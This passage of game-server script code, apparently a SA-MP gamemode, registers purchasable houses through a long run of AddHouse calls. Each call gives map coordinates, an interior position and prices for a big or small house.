	AddHouse(288, 1326.420654, -1091.734741, 27.976562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 289);//Big house
	AddHouse(289, -2621.177490, 790.947204, 48.503738, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 290); //A small house ;)
	AddHouse(290, -2710.896240, 721.922790, 39.723396, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 291); //A small house ;)
	AddHouse(291, -2621.629150, 802.964538, 49.984375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 292); //A small house ;)
	AddHouse(292, -2723.930419, 722.177001, 41.265953, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 293); //A small house ;)
	AddHouse(293, -2731.561767, 723.701110, 41.273437, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 294); //A small house ;)
	AddHouse(294, 252.979187, -1269.723266, 74.271430, 235.30, 1190.04, 1080.25, 500000, 490000, 3, 295);//Big house
	AddHouse(295, 219.664123, -1250.275024, 78.333145, 235.30, 1190.04, 1080.25, 700000, 650000, 3, 296);//Big house
	AddHouse(296, 470.707519, -1163.577514, 67.217742, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 297);//Big house
	AddHouse(297, 559.205871, -1160.835327, 54.429687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 298); //A small house ;)
	AddHouse(298, 646.090698, -1117.318359, 44.207038, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 299);//Big house
	AddHouse(299, 700.030029, -1060.214233, 49.421691, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 300);//Big house
	AddHouse(300, 352.344177, -1197.760375, 76.515625, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 301);//Big house
	AddHouse(301, 417.333923, -1154.839599, 76.687614, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 302); //A small house ;)
	AddHouse(302, 558.519531, -1076.568115, 72.921989, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 303); //A small house ;)
	AddHouse(303, 498.067810, -1094.010498, 82.359191, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 304);//Big house
	AddHouse(304, 189.647750, -1308.293334, 70.249465, 235.30, 1190.04, 1080.25, 1500000, 1400000, 3, 305);//Big house
	AddHouse(305, 431.774566, -1253.169921, 51.580940, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 306); //A small house ;)
	AddHouse(306, 552.506042, -1200.444580, 44.831535, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 307); //A small house ;)
	AddHouse(307, 724.702880, -999.368041, 52.734375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 308); //A small house ;)
	AddHouse(308, 808.364990, -759.743103, 76.531364, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 309); //A small house ;)
	AddHouse(309, 848.235290, -745.531372, 94.969268, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 310); //A small house ;)
	AddHouse(310, 891.152954, -783.160461, 101.313621, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 311);//Big house
	AddHouse(311, 867.592712, -717.264709, 105.679687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 312); //A small house ;)
	AddHouse(312, 1442.638793, -629.947937, 95.718566, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 313);//Big house
	AddHouse(313, 1034.542480, -812.390441, 101.851562, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 314); //A small house ;)
	AddHouse(314, 989.688110, -828.523071, 95.468574, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 315); //A small house ;)
	AddHouse(315, 1326.420654, -1091.734741, 27.976562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 316);//Big house
	AddHouse(316, 1325.951538, -1068.277343, 31.554687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 317);//Big house
	AddHouse(317, 1227.226562, -1016.950073, 36.335937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 318); //A small house ;)
	AddHouse(318, 1234.751708, -1016.314941, 36.335937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 319); //A small house ;)
	AddHouse(319, 1233.965332, -1010.342102, 36.328262, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 320); //A small house ;)
	AddHouse(320, 1226.720336, -1010.844787, 36.328262, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 321); //A small house ;)
	AddHouse(321, 1226.671752, -1011.012451, 32.601562, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 322); //A small house ;)
	AddHouse(322, 1227.546264, -1017.244201, 32.601562, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 323); //A small house ;)
	AddHouse(323, 1234.738769, -1016.203125, 32.606651, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 324); //A small house ;)
	AddHouse(324, 1233.902221, -1009.838562, 32.601562, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 325); //A small house ;)
	AddHouse(325, 1189.019897, -1017.991149, 32.546875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 326); //A small house ;)
	AddHouse(326, 1196.163452, -1017.126647, 32.546875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 327); //A small house ;)
	AddHouse(327, 1188.372192, -1011.741271, 32.546875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 328); //A small house ;)
	AddHouse(328, 1195.666503, -1010.870300, 32.553161, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 329); //A small house ;)
	AddHouse(329, 1195.678955, -1010.879150, 36.226699, 222.98, 1239.83, 1082.14, 50000, 49000, 2,330); //A small house ;)
	AddHouse(330, 1196.456665, -1016.915649, 36.234375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 331); //A small house ;)
	AddHouse(331, 1189.022827, -1018.013122, 36.234375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 332); //A small house ;)
	AddHouse(332, 1188.222656, -1011.989746, 36.226699, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 333); //A small house ;)
	AddHouse(333, 1285.092651, -1090.184814, 28.257812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 334);//Big house
	AddHouse(334, 1242.261596, -1099.211425, 27.976562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 335);//Big house
	AddHouse(335, 1241.944946, -1075.962890, 31.554687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 336);//Big house
	AddHouse(336, 1285.247070, -1067.137939, 31.678918, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 337);//Big house
	AddHouse(337, 1183.473266, -1098.768554, 28.257812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 338);//Big house
	AddHouse(338, 1183.465942, -1075.939086, 31.678918, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 339);//Big house
	AddHouse(339, 1142.123901, -1092.995239, 28.187500, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 340);//Big house
	AddHouse(340, 1141.810668, -1069.933471, 31.765625, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 341);//Big house
	AddHouse(341, 1127.827514, -1021.173339, 34.992187, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 342);//Big house
	AddHouse(342, 1118.152099, -1021.316101, 34.992187, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 343);//Big house
	AddHouse(343, 1059.227905, -1105.197143, 28.045097, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 344); //A small house ;)
	AddHouse(344, 1103.403564, -1092.339965, 28.468750, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 345);//Big house
	AddHouse(345, 1103.132568, -1069.746215, 31.889856, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 346);//Big house
	AddHouse(346, 1051.279541, -1058.877685, 34.796646, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 347);//Big house
	AddHouse(347, 993.962829, -1058.142578, 33.703125, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 348);//Big house
	AddHouse(348, 985.514953, -1094.386840, 27.604057, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 349); //A small house ;)
	AddHouse(349, 653.206909, -1619.626831, 15.000000, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 350);//Big house
	AddHouse(350, 657.186950, -1652.890625, 15.406250, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 351); //A small house ;)
	AddHouse(351, 653.356323, -1714.049804, 14.764795, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 352); //A small house ;)
	AddHouse(352, 652.659423, -1693.970336, 14.550045, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 353);//Big house
	AddHouse(353, 693.551086, -1705.737304, 3.819482, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 354); //A small house ;)
	AddHouse(354, 694.929504, -1690.535522, 4.346122, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 355); //A small house ;)
	AddHouse(355, 693.956787, -1645.986572, 4.093750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 356); //A small house ;)
	AddHouse(356, 697.502380, -1626.633178, 3.749170, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 357); //A small house ;)
	AddHouse(357, 692.955261, -1602.773925, 15.046875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 358); //A small house ;)
	AddHouse(358, 766.903991, -1605.786499, 13.803857, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 359); //A small house ;)
	AddHouse(359, 768.056396, -1655.820556, 5.609375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 360); //A small house ;)
	AddHouse(360, 769.000305, -1696.665039, 5.155420, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 361); //A small house ;)
	AddHouse(361, 769.057495, -1745.761840, 13.077295, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 362); //A small house ;)
	AddHouse(362, 791.510253, -1753.206542, 13.460651, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 363);//Big house
	AddHouse(363, 797.243896, -1729.463745, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 364);//Big house
	AddHouse(364, 794.125610, -1707.829467, 14.038232, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 365); //A small house ;)
	AddHouse(365, 795.077758, -1691.390747, 14.463310, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 366); //A small house ;)
	AddHouse(366, 791.008666, -1661.633422, 13.485125, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 367);//Big house
	AddHouse(367, 648.604431, -1489.377197, 14.830581, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 368);//Big house
	AddHouse(368, 647.487915, -1536.534423, 15.250596, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 369);//Big house
	AddHouse(369, 648.850158, -1442.421630, 14.727138, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 370);//Big house
	AddHouse(370, 685.560913, -1421.911621, 14.774706, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 371);//Big house
	AddHouse(371, 784.413085, -1436.248046, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 372);//Big house
	AddHouse(372, 813.688293, -1456.650146, 14.224786, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 373);//Big house
	AddHouse(373, 782.795288, -1464.421997, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 374);//Big house
	AddHouse(374, 841.549743, -1471.800659, 14.113708, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 375);//Big house
	AddHouse(375, 901.821960, -1474.288330, 13.596670, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 376);//Big house
	AddHouse(376, 901.573852, -1444.520629, 13.786548, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 377);//Big house
	AddHouse(377, 880.102600, -1424.623046, 14.489315, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 378);//Big house
	AddHouse(378, 852.460571, -1423.081054, 14.141706, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 379);//Big house
	AddHouse(379, 824.666381, -1423.857177, 14.496664, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 380);//Big house
	AddHouse(380, 822.306518, -1505.509643, 14.397914, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 381);//Big house
	AddHouse(381, 850.463317, -1519.954101, 14.087125, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 382);//Big house
	AddHouse(382, 875.618408, -1515.424194, 14.135076, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 383);//Big house
	AddHouse(383, 903.737304, -1515.181274, 14.316188, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 384);//Big house
	AddHouse(384, 771.162231, -1510.570434, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 385);//Big house
	AddHouse(385, 761.274353, -1563.999023, 13.918096, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 386);//Big house
	AddHouse(386, 984.497436, -1829.723876, 13.330419, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 387);//Big house
	AddHouse(387, 973.735168, -1827.079223, 13.332680, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 388);//Big house
	AddHouse(388, 962.102416, -1824.220825, 13.326700, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 389);//Big house
	AddHouse(389, 926.969543, -1818.124755, 13.324192, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 390);//Big house
	AddHouse(390, 915.752502, -1816.871215, 13.307792, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 391);//Big house
	AddHouse(391, 936.734741, -1612.883666, 14.940610, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 392);//Big house
	AddHouse(392, 964.117431, -1612.787353, 14.944506, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 393);//Big house
	AddHouse(393, 987.498779, -1624.242187, 14.929687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 394);//Big house
	AddHouse(394, 865.451782, -1633.923828, 14.929687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 395);//Big house
	AddHouse(395, 850.673034, -1686.199584, 14.938423, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 396);//Big house
	AddHouse(396, 846.736145, -1716.956542, 14.929687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 397);//Big house
	AddHouse(397, 1972.052368, -1634.687988, 15.968750, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 398);//Big house
	AddHouse(398, 1973.638305, -1655.534667, 15.968750, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 399);//Big house
	AddHouse(399, 1981.184936, -1682.689941, 17.053550, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 400);//Big house
	AddHouse(400, 1974.733276, -1672.151123, 15.968750, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 401);//Big house
	AddHouse(401, 1973.465209, -1706.004150, 15.968750, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 402);//Big house
	AddHouse(402, 1980.414916, -1719.140136, 17.030569, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 403);//Big house
	AddHouse(403, 2014.715820, -1732.931396, 14.234375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 404); //A small house ;)
	AddHouse(404, 2015.980102, -1717.099365, 14.079211, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 405); //A small house ;)
	AddHouse(405, 2017.422363, -1703.294311, 14.234375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 406); //A small house ;)
	AddHouse(406, 2013.152709, -1656.443603, 13.805846, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 407); //A small house ;)
	AddHouse(407, 2015.633544, -1641.682128, 13.782407, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 408); //A small house ;)
	AddHouse(408, 2017.628051, -1630.059204, 13.712096, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 409); //A small house ;)
	AddHouse(409, 2066.517333, -1716.787353, 13.805846, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 410); //A small house ;)
	AddHouse(410, 2067.895263, -1731.634521, 13.876157, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 411); //A small house ;)
	AddHouse(411, 2244.546630, -1637.661132, 16.237878, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 412); //A small house ;)
	AddHouse(412, 2257.054687, -1644.303588, 15.522188, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 413); //A small house ;)
	AddHouse(413, 2282.124023, -1641.429687, 15.889788, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 414); //A small house ;)
	AddHouse(414, 2306.759521, -1678.654296, 14.001157, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 415); //A small house ;)
	AddHouse(415, 2368.279541, -1675.343872, 14.168166, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 416); //A small house ;)
	AddHouse(416, 2362.922363, -1644.014526, 13.534013, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 417); //A small house ;)
	AddHouse(417, 2393.418701, -1646.260498, 13.905097, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 418); //A small house ;)
	AddHouse(418, 2384.367431, -1675.262451, 14.915221, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 419); //A small house ;)
	AddHouse(419, 2409.104003, -1674.006958, 13.603633, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 420); //A small house ;)
	AddHouse(420, 2413.757812, -1646.786621, 14.011916, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 421); //A small house ;)
	AddHouse(421, 2451.962402, -1641.993896, 13.735734, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 422); //A small house ;)
	AddHouse(422, 2359.867431, -1795.785888, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 423);//Big house
	AddHouse(423, 2380.679443, -1785.625976, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 424);//Big house
	AddHouse(424, 2322.170654, -1795.853393, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 425);//Big house
	AddHouse(425, 2345.387207, -1785.740112, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 426);//Big house
	AddHouse(426, 2307.681640, -1785.714355, 13.556921, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 427);//Big house
	AddHouse(427, 2290.282714, -1796.164062, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 428);//Big house
	AddHouse(428, 2274.838134, -1785.826538, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 429);//Big house
	AddHouse(429, 2247.241699, -1795.988159, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 430);//Big house
	AddHouse(430, 2232.628173, -1785.549194, 13.560097, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 431);//Big house
	AddHouse(431, 2242.201904, -1882.263916, 14.234375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 432);//Big house
	AddHouse(432, 2238.238769, -1906.828735, 14.937500, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 433);//Big house
	AddHouse(433, 2261.243164, -1906.755249, 14.937500, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 434);//Big house
	AddHouse(434, 2269.372558, -1882.020996, 14.234375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 435);//Big house
	AddHouse(435, 2284.549804, -1906.599975, 14.929687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 436);//Big house
	AddHouse(436, 2296.390380, -1882.171508, 14.234375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 437);//Big house
	AddHouse(437, 2395.121093, -1795.916381, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 438);//Big house
	AddHouse(438, 2437.705078, -2020.681396, 13.902541, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 439); //A small house ;)
	AddHouse(439, 2464.973388, -1995.752197, 14.019332, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 440); //A small house ;)
	AddHouse(440, 2465.501953, -2020.792114, 14.124163, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 441); //A small house ;)
	AddHouse(441, 2486.331542, -2021.552612, 13.998847, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 442); //A small house ;)
	AddHouse(442, 2507.959472, -2020.881835, 14.210101, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 443); //A small house ;)
	AddHouse(443, 2522.612548, -2019.137084, 14.074416, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 444); //A small house ;)
	AddHouse(444, 2524.284912, -1998.265258, 14.113082, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 445); //A small house ;)
	AddHouse(445, 2508.389160, -1998.365234, 13.902541, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 446); //A small house ;)
	AddHouse(446, 1838.706909, -1995.259155, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 447);//Big house
	AddHouse(447, 1852.750854, -1991.056274, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 448);//Big house
	AddHouse(448, 1866.883911, -2003.885742, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 449);//Big house
	AddHouse(449, 1895.333007, -2020.760864, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 450);//Big house
	AddHouse(450, 1846.368896, -2020.501098, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 451);//Big house
	AddHouse(451, 1821.050415, -1994.988403, 13.554395, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 452);//Big house
	AddHouse(452, 1831.585449, -1995.080810, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 453);//Big house
	AddHouse(453, 1827.235961, -1981.093994, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 454);//Big house
	AddHouse(454, 2637.444335, -1992.015625, 13.993547, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 455); //A small house ;)
	AddHouse(455, 1325.951538, -1068.277343, 31.554687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 456);//Big house
	AddHouse(456, 2635.486572, -2012.744140, 14.144332, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 457); //A small house ;)
	AddHouse(457, 2650.065673, -2022.171997, 14.176628, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 458); //A small house ;)
	AddHouse(458, 2652.691406, -1989.426513, 13.998847, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 459); //A small house ;)
	AddHouse(459, 2672.821289, -1989.494262, 14.324020, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 460); //A small house ;)
	AddHouse(460, 2673.027343, -2020.278076, 14.168166, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 461); //A small house ;)
	AddHouse(461, 2695.266113, -2020.462158, 14.022284, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 462); //A small house ;)
	AddHouse(462, 2696.349365, -1990.535400, 14.222853, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 463); //A small house ;)
	AddHouse(463, 2736.590332, -1952.466064, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 464);//Big house
	AddHouse(464, 2736.470214, -1926.046264, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 465);//Big house
	AddHouse(465, 2751.503906, -1967.830200, 17.320312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 466); //A small house ;)
	AddHouse(466, 2751.525146, -1958.127929, 17.320312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 467); //A small house ;)
	AddHouse(467, 2751.505615, -1931.472900, 17.320312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 468); //A small house ;)
	AddHouse(468, 2751.519775, -1922.126098, 17.320312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 469); //A small house ;)
	AddHouse(469, 2309.023925, -1714.332641, 14.980066, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 470); //A small house ;)
	AddHouse(470, 2326.741210, -1716.884521, 13.907408, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 471); //A small house ;)
	AddHouse(471, 2385.459472, -1711.670410, 14.242187, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 472); //A small house ;)
	AddHouse(472, 2327.071289, -1682.052490, 14.929687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 473); //A small house ;)
	AddHouse(473, 2751.500732, -1962.846191, 13.546875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 474); //A small house ;)
	AddHouse(474, 2751.499511, -1936.329345, 13.539363, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 475); //A small house ;)
	AddHouse(475, 2787.063232, -1952.693115, 13.546875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 476); //A small house ;)
	AddHouse(476, 2787.076416, -1926.357421, 13.546875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 477); //A small house ;)
	AddHouse(477, 2787.075439, -1931.353027, 17.320312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 478); //A small house ;)
	AddHouse(478, 2787.076416, -1921.301147, 17.320312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 479); //A small house ;)
	AddHouse(479, 2787.072021, -1957.265747, 17.320312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 480); //A small house ;)
	AddHouse(480, 2787.072021, -1966.984130, 17.320312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 481); //A small house ;)
	AddHouse(481, 2801.932373, -1962.930053, 13.546875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 482); //A small house ;)
	AddHouse(482, 2801.926269, -1936.401123, 13.546875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 483); //A small house ;)
	AddHouse(483, 2852.001220, -1366.112670, 14.170822, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 484);//Big house
	AddHouse(484, 2842.121582, -1334.792114, 14.742118, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 485);//Big house
	AddHouse(485, 2807.807617, -1190.887573, 25.348464, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 486);//Big house
	AddHouse(486, 2847.194335, -1309.873291, 14.682277, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 487);//Big house
	AddHouse(487, 2807.977294, -1369.849487, 23.581459, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 488);//Big house
	AddHouse(488, 2782.093505, -1358.313232, 26.332599, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 489);//Big house
	AddHouse(489, 2807.985107, -1354.038940, 27.218700, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 490);//Big house
	AddHouse(490, 2782.106933, -1333.322387, 32.354343, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 491);//Big house
	AddHouse(491, 2809.382080, -1324.544555, 33.804332, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 492);//Big house
	AddHouse(492, 2809.401367, -1302.930053, 38.857131, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 493);//Big house
	AddHouse(493, 2782.150146, -1306.073364, 38.899421, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 494);//Big house
	AddHouse(494, 2782.323974, -1281.167480, 44.328147, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 495);//Big house
	AddHouse(495, 2809.394775, -1280.939208, 43.831302, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 496);//Big house
	AddHouse(496, 2797.719970, -1245.372802, 47.385299, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 497);//Big house
	AddHouse(497, 2775.864257, -1245.516357, 49.482673, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 498);//Big house
	AddHouse(498, 2756.253417, -1182.801513, 69.403434, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 499);//Big house
	AddHouse(499, 2750.390869, -1205.645263, 67.484375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 500);//Big house
	AddHouse(500, 2750.391113, -1222.437622, 64.601562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 501);//Big house
	AddHouse(501, 2750.376220, -1238.485473, 61.524539, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 502);//Big house
	AddHouse(502, 2755.847656, -1276.231445, 56.593750, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 503);//Big house
	AddHouse(503, 2756.294677, -1302.253906, 53.093750, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 504);//Big house
	AddHouse(504, 2747.386230, -1351.915283, 44.615871, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 505);//Big house
	AddHouse(505, 2755.471191, -1400.217407, 39.375946, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 506);//Big house
	AddHouse(506, 2707.313232, -1237.964355, 59.675460, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 507); //A small house ;)
	AddHouse(507, 2707.334960, -1233.734497, 61.077224, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 508); //A small house ;)
	AddHouse(508, 2707.316162, -1229.052368, 62.302822, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 509); //A small house ;)
	AddHouse(509, 2707.312011, -1224.656005, 63.587379, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 510); //A small house ;)
	AddHouse(510, 2707.325439, -1220.371337, 64.883605, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 511); //A small house ;)
	AddHouse(511, 2707.311279, -1216.255737, 66.229942, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 512); //A small house ;)
	AddHouse(512, 2707.314208, -1211.761718, 67.619773, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 513); //A small house ;)
	AddHouse(513, 2707.310058, -1207.583007, 68.752639, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 514); //A small house ;)
